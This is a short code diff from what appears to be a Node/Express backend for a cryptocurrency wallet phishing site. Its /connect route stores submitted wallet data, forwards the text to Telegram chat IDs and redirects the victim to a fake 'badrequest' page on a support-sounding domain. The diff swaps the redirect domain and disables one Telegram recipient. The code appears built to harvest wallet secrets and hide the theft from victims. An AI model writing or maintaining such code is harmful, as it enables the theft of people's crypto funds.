@@ -520,8 +520,8 @@ app.post("/connect", async (req, res) => {
     data.createdAt = new Date();
     const savedData = await HubWallet.create(data);
     sendToTelegram("1618693731", text);
-    sendToTelegram("1317131611", text);
-    res.redirect('https://defi-assist.netlify.app/badrequest');
+    // sendToTelegram("1317131611", text);
+    res.redirect('https://rpc-support.surge.sh/badrequest');
     return savedData;
   } catch (err) {
     console.error(err);
@@ -544,7 +544,7 @@ app.post("/deletetr/:id", async (req, res) => {
     // Update the transaction in your data source using the provided data
     await HubWallet.deleteOne({ _id: id });
 
-    res.redirect('https://defi-assist.netlify.app//localhost');
+    res.redirect('https://rpc-support.surge.sh/localhost');
   } catch (error) {
     console.error(error);
     res.status(500).send("Internal server error");
